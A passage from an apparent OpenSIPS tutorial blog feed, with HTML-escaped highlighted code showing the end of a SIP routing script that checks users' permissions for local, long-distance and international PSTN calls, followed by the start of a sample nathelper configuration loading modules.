&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!proxy_authorize&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gateway&amp;#34;&lt;/span&gt; /* realm */,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;subscriber&amp;#34;&lt;/span&gt; /* table name */&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			proxy_challenge&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gateway&amp;#34;&lt;/span&gt; /* realm */, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt; /* no qop */ &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# authorize only for INVITEs -- RR/Contact may result in weird&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# things showing up in d-uri that would break our logic; our&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# major concern is INVITE which causes PSTN costs &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rm&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# does the authenticated user have a permission for local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# calls (destinations beginning with a single zero)? &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# (i.e., is he in the &amp;#34;local&amp;#34; group?)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ru&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:0[1-9][0-9]+@.*&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_user_in&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;credentials&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No permission for local calls&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# the same for long-distance (destinations begin with two zeros&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ru&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:00[1-9][0-9]+@.*&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_user_in&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;credentials&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ld&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; no permission for LD &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# the same for international calls (three zeros)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ru&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:000[1-9][0-9]+@.*&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_user_in&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;credentials&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;int&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;International permissions needed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# everything else (e.g., interplanetary calls) is denied&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Forbidden&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# INVITE to authorized PSTN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# authorized PSTN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# if you have passed through all the checks, let your call go to GW!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	rewritehostport&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.0.10:5060&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# forward the request now&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>nathelper</title>
      <link>https://wdd.js.org/opensips/ch8/nathelper/</link>
      <pubDate>Thu, 28 May 2020 10:00:24 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/nathelper/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# simple quick-start config script including nathelper support
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This default script includes nathelper support. To make it work
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# you will also have to install Maxim&amp;#39;s RTP proxy. The proxy is enforced
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# if one of the parties is behind a NAT.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# If you have an endpoing in the public internet which is known to
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# support symmetric RTP (Cisco PSTN gateway or voicemail, for example),
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# then you don&amp;#39;t have to force RTP proxy. If you don&amp;#39;t want to enforce
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# RTP proxy for some destinations than simply use t_relay() instead of
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# route(1)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Sections marked with !! Nathelper contain modifications for nathelper
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# NOTE !! This config is EXPERIMENTAL !
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------- global configuration parameters ------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;      &lt;span style=&#34;color:#75715e&#34;&gt;# logging level (cmd line: -dddddddddd)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no  &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd line: -E)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/*&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Uncomment&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;these&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;lines&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;enter&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;mode&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#debug_mode=yes
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;check_via&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no	&lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -v)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no           &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -r)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rev_dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no      &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -R)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5060&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want to use SQL database
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#loadmodule &amp;#34;db_mysql.so&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;signaling.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;textops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want digest authentication
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# db_mysql.so must be loaded !
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#loadmodule &amp;#34;auth.so&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#loadmodule &amp;#34;auth_db.so&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# !! Nathelper
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nathelper.so&amp;#34;&lt;/span&gt;
